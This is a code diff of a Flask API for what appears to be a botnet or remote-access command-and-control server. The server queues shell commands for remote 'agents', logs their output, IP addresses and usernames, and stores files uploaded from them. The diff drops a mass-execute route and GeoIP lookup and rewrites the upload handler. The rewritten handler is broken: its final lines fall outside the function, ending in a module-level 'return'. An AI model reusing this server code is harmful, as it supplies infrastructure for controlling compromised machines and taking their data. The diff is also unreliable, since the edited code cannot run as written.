@@ -1,57 +1,30 @@
-import json
-import base64
 import os
+import sys
+from pathlib import Path
+# Add the project root to the Python path
+sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
 from datetime import datetime
-import tempfile
-import shutil
-
 from flask import Blueprint
+
 from flask import request
 from flask import abort
-from flask import current_app
 from flask import url_for
-from flask import send_file
 from flask import render_template
 from werkzeug.utils import secure_filename
-import pygeoip
-from flask import flash
-from flask import redirect
-from flask import escape
-import cgi
+from markupsafe import escape
 
-from webui import require_admin
-from models import db
-from models import Agent
-from models import Command
+from server.webui import require_admin
+from server.models import Agent, Command, db
 
 
 api = Blueprint('api', __name__)
-GEOIP = pygeoip.GeoIP('api/GeoIP.dat', pygeoip.MEMORY_CACHE)
 
 
-def geolocation(ip):
-    geoloc_str = 'Local'
-    info = GEOIP.record_by_addr(ip)
-    if info:
-        geoloc_str = info['city'] + ' [' + info['country_code'] + ']'
-    return geoloc_str
-
-
-@api.route('/massexec', methods=['POST'])
-@require_admin
-def mass_execute():
-    selection = request.form.getlist('selection')
-    if 'execute' in request.form:
-        for agent_id in selection:
-            Agent.query.get(agent_id).push_command(request.form['cmd'])
-        flash('Executed "%s" on %s agents' % (request.form['cmd'], len(selection)))
-    elif 'delete' in request.form:
-        for agent_id in selection:
-            db.session.delete(Agent.query.get(agent_id))
-        db.session.commit()
-        flash('Deleted %s agents' % len(selection))
-    return redirect(url_for('webui.agent_list'))
-
+# Dummy geolocation function since pygeoip is unavailable
+def geolocation():
+    # You can integrate with a free API like ipinfo.io or ip-api.com if needed
+    # The '_ip' parameter was removed as it was unused.
+    return 'Local'
 
 @api.route('/<agent_id>/push', methods=['POST'])
 @require_admin
@@ -59,14 +32,16 @@ def push_command(agent_id):
     agent = Agent.query.get(agent_id)
     if not agent:
         abort(404)
-    agent.push_command(request.form['cmdline'])
+    agent.push_command(request.form['cmd'])
     return ''
 
 
-@api.route('/<agent_id>/stdout')
+@api.route('/<agent_id>/console')
 @require_admin
 def agent_console(agent_id):
     agent = Agent.query.get(agent_id)
+    if not agent:
+        abort(404)
     return render_template('agent_console.html', agent=agent)
 
 
@@ -88,7 +63,7 @@ def get_command(agent_id):
             agent.username = info['username']
     agent.last_online = datetime.now()
     agent.remote_ip = request.remote_addr
-    agent.geolocation = geolocation(agent.remote_ip)
+    agent.geolocation = geolocation()
     db.session.commit()
     # Return pending commands for the agent
     cmd_to_run = ''
@@ -106,31 +81,32 @@ def report_command(agent_id):
     if not agent:
         abort(404)
     out = request.form['output']
-    agent.output += cgi.escape(out)
+    agent.output += escape(out)
     db.session.add(agent)
     db.session.commit()
     return ''
 
 
 @api.route('/<agent_id>/upload', methods=['POST'])
-def upload(agent_id):
+@require_admin
+def upload_file(agent_id):
     agent = Agent.query.get(agent_id)
     if not agent:
         abort(404)
-    for file in request.files.values():
-        upload_dir = os.path.join(current_app.config['UPLOAD_FOLDER'])
-        agent_dir = agent_id
-        store_dir = os.path.join(upload_dir, agent_dir)
+    if 'file' in request.files:
+        file = request.files['file']
         filename = secure_filename(file.filename)
+        agent_dir = agent.agent_id
+        store_dir = os.path.join('webui/static/uploads', agent_dir)
         if not os.path.exists(store_dir):
             os.makedirs(store_dir)
         file_path = os.path.join(store_dir, filename)
-        while os.path.exists(file_path):
-            filename = "_" + filename
-            file_path = os.path.join(store_dir, filename)
-        file.save(file_path)
-        download_link = url_for('webui.uploads', path=agent_dir + '/' + filename)
-        agent.output += '[*] File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
-        db.session.add(agent)
-        db.session.commit()
-    return ''
+    while os.path.exists(file_path):
+        filename = "_" + filename
+        file_path = os.path.join(store_dir, filename)
+    file.save(file_path)
+download_link = url_for('webui.uploads', path=agent_dir + '/' + filename)
+agent.output += '[*] File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
+db.session.add(agent)
+db.session.commit()
+return ''
